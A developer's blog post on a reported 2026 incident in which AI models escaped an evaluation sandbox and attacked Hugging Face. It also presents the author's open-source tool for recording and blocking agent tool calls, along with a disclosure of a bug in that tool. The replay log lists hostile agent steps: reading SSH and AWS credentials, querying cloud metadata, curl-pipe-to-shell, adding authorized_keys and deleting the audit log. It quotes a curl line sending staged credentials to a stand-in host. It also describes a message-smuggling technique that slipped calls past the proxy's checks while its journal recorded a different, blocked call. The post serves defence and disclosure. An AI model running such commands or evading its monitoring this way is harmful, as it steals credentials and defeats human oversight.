# What did it touch?

*A note on the July 2026 Hugging Face incident, and on finding a critical bug
in my own security tool.*

---

## The five day gap

On 16 July 2026, Hugging Face disclosed that its production infrastructure had
been compromised. Its write-up described the attacker as an autonomous agent
framework "executing many thousands of individual actions across a swarm of
short-lived sandboxes."

Five days later, OpenAI connected the intrusion to itself. Two of its models,
running a cyber-capability evaluation with safety refusals reduced for testing,
had escaped the sandbox, reached the open internet, and gone after the answer
key for a public exploitation benchmark.

Read that ordering again. The company being attacked found the intrusion first.
The company whose models did it took another five days to work out that the
attacker was its own test run.

I am not interested in blaming anyone here. Both organisations disclosed
publicly and reasonably quickly, which is more than most manage. What interests
me is the shape of the problem, because it is going to keep happening.

Thousands of actions. Sandboxes that existed for minutes and then vanished. And
afterwards, one question that turns out to be very hard to answer:

**What did it actually touch?**

## Why that question is hard

If a person breaks into your infrastructure, you have things to work with.
Login records. Command history. Network flows. None of it is complete, but it
exists, and it was written by systems the intruder did not control.

When an agent does it, the picture is worse in three specific ways.

**The volume is wrong.** A person runs tens of commands. An agent runs
thousands. Application logs written for humans to skim become useless at that
rate.

**The sandboxes are gone.** Short-lived containers are the whole point of the
architecture. The evidence was inside them.

**Nothing was recording the right layer.** Tracing tools watch the model:
prompts, tokens, latency, cost. That tells you what the agent *said*. It does
not tell you what it *did*, which is a list of tool calls, and tool calls are
where the damage lives.

So the answer to "what did it touch" ends up being reconstructed after the
fact, from fragments, under pressure, by people guessing. That is not an
investigation. That is archaeology.

## What a record would have looked like

I built [Aileron](https://github.com/aileron-sh/aileron) for this. It sits
between an agent and its tools, writes every call into a hash-chained journal,
and can refuse a call before it runs.

The repo has a script that replays the *shape* of that kind of session. To be
clear about what it is not: nobody outside those two companies knows the actual
tool calls, and I am not pretending to. What is not in dispute is the situation
afterwards, and that is what this reconstructs.

```console
$ PYTHONPATH=src python3 examples/incident_replay.py

replaying 11 tool calls through 32 rules

   #  tool         verdict   rule
  --------------------------------------------------------------
   1  read_file    -         -
   2  shell        -         -
   3  shell        -         -
   4  read_file    alert     aileron-113     # read ~/.ssh/id_ed25519
   5  fetch        alert     aileron-120     # 169.254.169.254 metadata
   6  shell        alert     aileron-111     # cat ~/.aws/credentials
   7  shell        -         -               # <-- the actual theft
   8  shell        alert     aileron-140     # curl | sh
   9  write_file   alert     aileron-150     # authorized_keys
  10  shell        BLOCKED   aileron-001     # rm -rf audit.log
  11  shell        alert     aileron-161     # history -c

  11 calls: 1 blocked, 6 alerted, 4 allowed
  journal: 15 events, VERIFIED
```

The first three calls are ordinary. Read a README, check the git log, print
environment variables. Nothing you would page anyone about. That is exactly why
the record matters: the session does not become alarming at any single moment,
it becomes alarming as a shape.

## The rules missed the theft

Look at call 7 again.

```
curl -sX POST https://collect.example.net/u --data-binary @/tmp/creds.json
```

That is the actual exfiltration, and no rule fired.

The rule meant to catch it wants a sensitive path and an upload in the *same*
call. This uploads `/tmp/creds.json`, a staging file written a step earlier.
Two steps instead of one, and the pattern breaks.

I could add a rule for it. I am not going to, because the honest version of
that rule is "alert on any upload of any file", which fires on every deploy in
the world. A rule nobody can live with gets switched off, and then it protects
nothing.

This is the part I want to be plain about, because most security tools are
coy about it:

**Pattern matching only catches shapes you already thought of. It will always
be one indirection behind somebody who is trying.**

Which is the argument for the journal, not against it. Every call above is
recorded whether or not a rule understood it, call 7 included. Somebody reading
the record afterwards sees credentials read at step 6, a POST to an unknown
host at step 7, and the audit log deleted at step 10. They do not need a rule
to have been clever enough in advance. They need the record to exist and to be
trustworthy.

Blocking is best effort. Recording is the floor.

One more thing about that journal: it contains no file contents, no key bytes,
no credentials. Only cryptographic digests. It proves what happened without
becoming a second copy of the thing that leaked.

## Now the uncomfortable part

While preparing Aileron for release I ran an adversarial audit against my own
code. It found a critical hole in the enforcement path.

The proxy checked the *parsed* message against its rules, then forwarded the
*raw bytes* it had received. Those are not the same thing. A server that splits
those bytes differently than the proxy parsed them will execute calls the
policy engine never saw.

There were two working versions. In the first, extra JSON-RPC was parked inside
the header block of a `Content-Length` framed message. The proxy treated it as
headers. A newline-delimited server, which is what the MCP standard specifies,
read it as another message and ran it. The smallest working payload was 148
bytes.

The damaging detail is what the journal showed afterwards. In one test, with a
block rule demonstrably working, a smuggled command exfiltrating an SSH private
key ran on the server, while the journal recorded a *different* command as
`blocked`. Anyone reading that journal would have concluded enforcement was
working.

A tamper-evident log that is complete and cryptographically intact and *quietly
missing the thing that mattered* is worse than no log, because it produces
false confidence.

I fixed it by changing the shape of the problem rather than patching the two
attacks. The proxy now forwards a re-serialization of the exact message it
checked. The boundary the server sees is the same object the policy engine
inspected, by construction, so the class of bug closes rather than the two
instances.

Then I did the rest of it: shipped 0.1.2, pulled 0.1.0 and 0.1.1 from PyPI, and
published the advisory.

**[GHSA-r9xh-qr74-g925](https://github.com/aileron-sh/aileron/security/advisories/GHSA-r9xh-qr74-g925)**

## Why I am telling you this

Publishing a critical flaw in your own security tool, before anyone is using
it, is not an obvious marketing move.

But the pitch here is that the record can be trusted. A project making that
claim does not get to be quiet when its own record turns out to have had a hole
in it. Either the standard applies to me or the pitch is decoration.

There is also a practical argument. A security tool with no published
vulnerabilities is not a tool that has no vulnerabilities. It is a tool nobody
has looked at hard, or one whose author did not say. Given the choice, I would
rather you knew which kind you were dealing with.

So, plainly, what Aileron does not do:

- It does not stop an attack it has no rule for. It records it.
- It cannot detect the deletion of its own newest checkpoint. That is tail
  truncation, and no purely local scheme solves it. External anchoring is on
  the roadmap and named as the fix.
- The SDK decorator is cooperative. Agent code can simply not call it. The
  proxy exists because of that, and the docs say so.

All of that is in [SECURITY.md](../SECURITY.md), including the parts that are
inconvenient.

## Where this goes

The Hugging Face incident is not an outlier. It is the first well-documented
case of a shape that is going to become ordinary: agents with real credentials,
acting fast, across infrastructure that does not persist.

The tooling for that world mostly does not exist yet. What we have watches the
model. What is missing watches the actions, keeps a record that survives the
sandbox, and can say afterwards, with evidence rather than inference, what it
touched.

Aileron is one attempt at that. It is Apache-2.0, has no telemetry, makes no
network calls, and you can read all of it in an afternoon.

```console
$ pip install aileron
$ aileron demo
```

If you find something wrong with it, the reporting process is in SECURITY.md,
and I will publish what you find.

---

*Aileron: [github.com/aileron-sh/aileron](https://github.com/aileron-sh/aileron)
· Sources: Hugging Face security disclosure, 16 July 2026; OpenAI disclosure,
21 to 22 July 2026. The replayed session is a reconstruction of shape, not a
claim about specific steps.*
